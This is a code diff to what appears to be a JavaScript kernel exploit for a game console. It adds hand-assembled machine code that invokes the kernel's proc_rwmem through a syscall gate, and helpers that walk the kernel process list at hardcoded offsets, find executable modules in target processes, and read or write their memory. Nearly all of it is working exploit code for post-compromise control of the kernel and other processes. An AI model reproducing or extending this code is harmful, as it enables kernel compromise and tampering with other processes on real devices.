@@ -720,6 +720,20 @@ function openRing0(roomAt) {
     return this.write(at, b);
   };
 
+  /* Invoke the 14.02 kernel proc_rwmem routine through the syscall-11 gate.
+     The caller supplies a UIO structure in its live address space. */
+  r.callProcRw = function (process, uio, functionAddress) {
+    const c = this.begin();
+    c.hex("48bf").qw(process);
+    c.hex("48be").qw(uio);
+    c.hex("48b8").qw(functionAddress);
+    c.hex("ffd0");
+    c.hex("48ba").qw(plus(this.at, OUT));
+    c.hex("488902");
+    if (!this.run()) return -1;
+    return rd4(plus(this.at, OUT)) | 0;
+  };
+
   return r;
 }
 
@@ -2249,6 +2263,124 @@ async function attempt(ctx, opts) {
 
   /* ---- hand the host its kernel interface ------------------------------ */
 
+  const processCache = new Map();
+
+  function isNull64(q) {
+    return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0);
+  }
+
+  function readKernelCString(at, max) {
+    const bytes = k.read(at, max);
+    if (!bytes) return "";
+    let out = "";
+    for (let i = 0; i < bytes.length; i++) {
+      if (bytes[i] === 0) break;
+      out += String.fromCharCode(bytes[i]);
+    }
+    return out;
+  }
+
+  function findProcessByName(name) {
+    const allproc = k.read_v(kat(0x01b28538));
+    if (isNull64(allproc)) return null;
+    let current = allproc;
+    let found = null;
+    for (let i = 0; i < 2048 && !isNull64(current); i++) {
+      const comm = readKernelCString(plus(current, 0x454), 32);
+      if (comm === name) {
+        if (found) return null;
+        found = current;
+      }
+      current = k.read_v(current);
+    }
+    return found;
+  }
+
+  function findProcessByPid(pid) {
+    const cached = processCache.get(pid);
+    if (cached) return cached;
+    const allproc = k.read_v(kat(0x01b28538));
+    if (isNull64(allproc)) return null;
+    let current = allproc;
+    for (let i = 0; i < 2048 && !isNull64(current); i++) {
+      const raw = k.read(plus(current, 0xb0), 4);
+      if (!raw) return null;
+      const currentPid = (raw[0] | (raw[1] << 8) |
+        (raw[2] << 16) | (raw[3] << 24)) >>> 0;
+      if (currentPid === (pid >>> 0)) {
+        processCache.set(pid, current);
+        return current;
+      }
+      current = k.read_v(current);
+    }
+    return null;
+  }
+
+  function findProcessModule(processName, moduleName) {
+    const target = findProcessByName(processName);
+    if (isNull64(target)) return null;
+    const vmspace = k.read_v(plus(target, 0x168));
+    if (isNull64(vmspace)) return null;
+    let entry = k.read_v(plus(vmspace, 8));
+    let match = null;
+    for (let i = 0; i < 4096 && !isNull64(entry); i++) {
+      const name = readKernelCString(plus(entry, 0x8d), 32);
+      if (name.indexOf(moduleName) !== -1) {
+        const start = k.read_v(plus(entry, 0x20));
+        const end = k.read_v(plus(entry, 0x28));
+        const protBytes = k.read(plus(entry, 0x5c), 2);
+        if (!isNull64(start) && !isNull64(end) && protBytes) {
+          const prot = protBytes[0] | (protBytes[1] << 8);
+          const startN = (start.hi >>> 0) * 0x100000000 + (start.low >>> 0);
+          const endN = (end.hi >>> 0) * 0x100000000 + (end.low >>> 0);
+          if ((prot & 5) === 5 && endN > startN) {
+            if (match) return null;
+            match = { pid: 0, process: target, base: start,
+              size: splitNum(endN - startN) };
+          }
+        }
+      }
+      entry = k.read_v(plus(entry, 8));
+    }
+    if (!match) return null;
+    const pidBytes = k.read(plus(target, 0xb0), 4);
+    if (!pidBytes) return null;
+    match.pid = (pidBytes[0] | (pidBytes[1] << 8) |
+      (pidBytes[2] << 16) | (pidBytes[3] << 24)) >>> 0;
+    processCache.set(match.pid, target);
+    return match;
+  }
+
+  function processReadWrite(pid, targetAddress, dataAddress, length, write) {
+    if (!Number.isInteger(pid) || pid <= 0 ||
+        !Number.isInteger(length) || length < 1 || length > 0x1000 ||
+        isNull64(targetAddress) || isNull64(dataAddress))
+      return false;
+    const target = findProcessByPid(pid);
+    if (isNull64(target)) return false;
+
+    const iov = alloc(0x10);
+    const uio = alloc(0x30);
+    pokeAt(iov, 0, dataAddress);
+    iov.dv.setUint32(8, length, true);
+    pokeAt(uio, 0, iov.at);
+    uio.dv.setUint32(8, 1, true);
+    pokeAt(uio, 0x10, targetAddress);
+    pokeAt(uio, 0x18, splitNum(length));
+    uio.dv.setUint32(0x20, 1, true);       /* UIO_SYSSPACE */
+    uio.dv.setUint32(0x24, write ? 1 : 0, true);
+    pokeAt(uio, 0x28, thread);
+
+    const procRwmem = plus(kbase, 0x00366a10);
+    const functionBytes = k.read(procRwmem, 8);
+    if (!functionBytes || functionBytes.every(byte => byte === 0))
+      return false;
+    const result = k.callProcRw(target, uio.at, procRwmem);
+    const remainingLow = uio.dv.getUint32(0x18, true);
+    const remainingHigh = uio.dv.getUint32(0x1c, true);
+    return result === 0 && remainingLow === 0 && remainingHigh === 0;
+  }
+
   const iface = {
     base: kbase,
     curproc: proc,
@@ -2277,6 +2409,10 @@ async function attempt(ctx, opts) {
     },
     read8: function (at) { return k.read_v(at); },
     write8: function (at, q) { return k.write_v(at, q); },
+    findModule: function (processName, moduleName) {
+      return findProcessModule(processName, moduleName);
+    },
+    processReadWrite: processReadWrite,
     /* On this platform the loader tables are text relative -- the PS4 row
        carries PRISON0 0x111fa18 and ROOTVNODE 0x2136e90, the same values used
        above against this base -- so data_base holds it too. */
